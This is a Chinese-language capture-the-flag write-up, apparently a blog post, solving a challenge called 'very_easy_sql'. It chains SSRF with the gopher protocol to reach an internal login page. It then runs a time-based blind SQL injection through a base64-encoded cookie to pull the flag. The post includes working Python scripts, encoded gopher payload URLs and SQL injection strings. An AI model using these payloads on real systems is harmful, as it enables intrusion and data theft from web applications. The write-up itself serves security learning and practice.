### 文章目录

- [very_easy_sql](https://www.cnblogs.com/0kai0/p/17018175.html#very_easy_sql_2)
- - [gopher协议和ssrf联合使用](https://www.cnblogs.com/0kai0/p/17018175.html#gopherssrf_10)
    - [构造payload](https://www.cnblogs.com/0kai0/p/17018175.html#payload_52)
    - - [SQL注入](https://www.cnblogs.com/0kai0/p/17018175.html#SQL_84)

# very_easy_sql

主页没有回显，先查看源代码看到注释有**use.php**。且有一句  
**you are not an inner user, so we can not let you have identify~**.意思是需要以本地用户访问。这里又没有rce、越权、文件包含等。那么很有可能有ssrf。

- 构造本地访问:`use.php/url=127.0.0.1/use.php`  
    看到有两个输入框，确定了有ssrf

## gopher协议和ssrf联合使用

> gopher协议是一种信息查找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面

利用:  
攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求  
发送GET请求和POST请求  
我们现在最多看到使用这个协议的时候都是在去ssrf打redis shell、读mysql数据的时候

- **gopher协议的格式：gopher://IP:port/_TCP/IP数据流**
    
- GET请求:  
    构造HTTP数据包,URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束
    
- POST请求  
    POST与GET传参的区别：它有4个参数为必要参数  
    需要传递Content-Type,Content-Length,host,post的参数  
    Content-Length和POST的参数长度必须一致
    

python脚本生成payload（POST和GET请求都适用）

```py
import urllib.parse

payload = """
POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=a68a3b03e80ce7fef96007dfa01dc077
"""
tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)
```

- %0d%0a代表空格双重url编码，gopher会将第一个字符吞噬，所以加个下划线
- 回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a
- 在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）

## 构造payload

brupsuit拿捏一个数据包代入python脚本

```py
import urllib.parse

host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
content_length = len(content)

payload =\
"""POST /index.php HTTP/1.1
Host: {}
User-Agent: curl/7.43.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}
""".format(host,content_length,content)

tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)
```

![请添加图片描述](https://img-blog.csdnimg.cn/faae1b92bcac41e6b02fce762c5a1060.png)  
直接开炮  
pyload:`http://61.147.171.105:53922/use.php?url=gopher%3A//127.0.0.1%3A80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A`

### SQL注入

响应包有如下数据  
![在这里插入图片描述](https://img-blog.csdnimg.cn/a9fb18b64e7b4637916fe30dd35ac115.png)  
返回数据包有set-cookie,但是这种ctf要什么cookie呢，看别人wp，cookie是注入点。  
**bp抓包扔进sqlmap×**，因为是gopher协议带进去注入，所以**再用一次ssrf脚本√**.带上cookie

```py
import urllib.parse
import requests
import time
import base64

host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
content_length = len(content)

payload =\
"""GET /index.php HTTP/1.1
Host: localhost:80
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: this_is_your_cookie"""

tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new+"="
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)

url="http://61.147.171.105:60622/use.php?url="
flag=""
for pos in range(1,50):
    for i in range(33,127):
        #poc="') union select 1,2,if(1=1,sleep(5),1) # "

        #security
        #poc="') union select 1,2,if(ascii( substr((database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "

        #flag
        #poc="') union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
        
        poc="') union select 1,2,if(ascii( substr((select * from flag),"+str(pos)+",1) )="+str(i)+",sleep(2),1) # "
        
        bs = str(base64.b64encode(poc.encode("utf-8")), "utf-8")
        final_poc=result+bs+"%3B%250d%250a"
        t1=time.time()
        res=requests.get(url+final_poc)
        t2=time.time()
        if(t2-t1>2):
            flag+=chr(i)
            print(flag)
            break
print(flag)

```

![1](https://img-blog.csdnimg.cn/a4c1feb6ec494c25b63611c69c5a6f80.png)

捏吗的，不知道为啥第一位是错的。在写脚本时要注意=别被二次编码了。一道题，难得扣